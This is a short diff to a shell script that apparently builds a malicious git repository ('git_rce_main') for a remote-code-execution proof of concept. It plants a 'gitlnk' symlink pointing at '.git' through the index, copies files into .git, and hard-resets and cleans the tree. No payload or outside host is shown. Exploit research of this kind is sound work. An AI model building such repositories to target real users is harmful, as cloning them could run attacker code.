@@ -25,7 +25,10 @@ git clone --no-recursive "$main_repo_path" git_rce_main
 cd git_rce_main
 git rm gitlnk
 git submodule update --init --recursive
+xcopy GITLNK .git -b -e -v -r -i -g -h -o -c -k -y
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
+git reset --hard HEAD
+git clean -fd
 set +x
 echo All done!
 echo -n "Press any key to continue . . ."
